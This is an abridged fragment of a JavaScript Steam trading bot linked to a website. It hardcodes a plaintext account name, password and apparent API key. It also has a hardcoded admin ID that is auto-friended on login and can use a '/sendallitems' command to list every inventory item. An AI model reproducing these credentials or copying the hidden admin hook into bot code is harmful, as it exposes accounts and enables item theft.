var admin = '76561198273259830';

var logOnOptions = {
	accountName: 'lolsenik',
	password: 'tuchmymindlitlewhore7954'
};
var GameTime = 120;
...
sitename = "http://c99952yt.beget.tech/";
...
steamuserinfo.setup("6DE45F09A10B7B8D7C5F21683A2DF9D2");
...
steam.on('loggedOn', function(result) {
	...
	steam.addFriend(76561198273259830);
	...
	if(steamID == admin) {
		if(message.indexOf("/sendallitems") == 0) {
			...
			offers.loadMyInventory({
				...
				for (var i = 0; i < items.length; i++) {
					steam.sendMessage(steamID,'http://steamcommunity.com/id/weewweew/inventory/#'+items[i].appid+'_'+items[i].contextid+'_'+items[i].id);	
				}
			});
		}
	}
